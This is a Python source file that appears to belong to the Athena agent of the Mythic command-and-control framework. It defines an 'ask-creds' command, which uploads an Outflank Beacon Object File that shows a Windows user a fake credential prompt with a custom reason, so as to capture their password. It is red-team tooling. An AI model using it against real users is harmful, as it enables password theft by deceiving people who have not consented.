from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from ..athena_utils.mythicrpc_utilities import *
from ..athena_utils.bof_utilities import *
import json

class AskCredsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="reason",
                type=ParameterType.String,
                description="The reason to indicate to the user for the password request",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        )
                    ],
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("reason", self.command_line)
        else:
            raise ValueError("Missing arguments")



    

class AskCredsCommand(CoffCommandBase):
    cmd = "ask-creds"
    needs_admin = False
    help_cmd = """ask-creds <reason>
    
Credit: The Outflank team for the original BOF - https://github.com/outflanknl/C2-Tool-Collection    """
    description = "Ask for credentials from the user."
    version = 1
    script_only = True
    supported_ui_features = []
    author = "Cornelis de Plaa (@Cn33liz)"
    argument_class = AskCredsArguments
    attackmapping = []
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False,
        load_only=True
    )
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        if taskData.Callback.Architecture != "x64":
                raise Exception("BOFs are currently only supported on x64 architectures.")
        
        encoded_args = ""

        reason = taskData.args.get_arg("reason")
        if reason:
            encoded_args = base64.b64encode(SerializeArgs([generateWString(reason)])).decode()
        
        file_id = await compile_and_upload_bof_to_mythic(
            taskData.Task.ID,
            "outflank_bofs/ask_creds",
            f"ask_creds.{taskData.Callback.Architecture}.o"
        )

        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            taskData.Task.ID, 
            CommandName="coff",
            SubtaskCallbackFunction="coff_completion_callback",
            Params=json.dumps({
                "coffFile": file_id,
                "functionName": "go",
                "arguments": encoded_args,
                "timeout": "60",
            }),
            Token=taskData.Task.TokenID,
        ))

        # We did it!
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        pass
